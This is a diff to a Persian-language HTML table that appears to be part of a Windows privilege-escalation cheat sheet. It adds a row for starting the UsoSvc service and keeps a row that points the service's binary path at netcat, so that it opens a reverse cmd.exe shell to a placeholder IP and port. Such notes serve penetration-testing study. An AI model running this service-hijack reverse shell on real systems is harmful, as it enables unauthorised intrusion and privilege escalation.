@@ -427,10 +427,14 @@ published: true
     </tr>
     <tr>
       <td style="text-align:left">sc stop UsoSvc</td>
-      <td style="text-align:left">توقف سرویس</td>
+      <td style="text-align:left">توقف سرویس UsoSvc</td>
     </tr> 
     <tr>
-      <td style="text-align:left">sc config UsoSvc binpath="c:\windows\temp\nc.exe ip port -e C:\windows\system32\cmd.exe"</td>
+      <td style="text-align:left">sc start UsoSvc</td>
+      <td style="text-align:left">راه اندازی سرویس UsoSvc</td>
+    </tr> 
+    <tr>
+      <td style="text-align:left">sc config UsoSvc binpath="c:\windows\temp\nc.exe ip port -e C:\windows\system32\cmd.exe"       </td>
       <td style="text-align:left">تغییر مسیر فایل اجرایی توسط UsoSvc</td>
     </tr> 
     <tr>
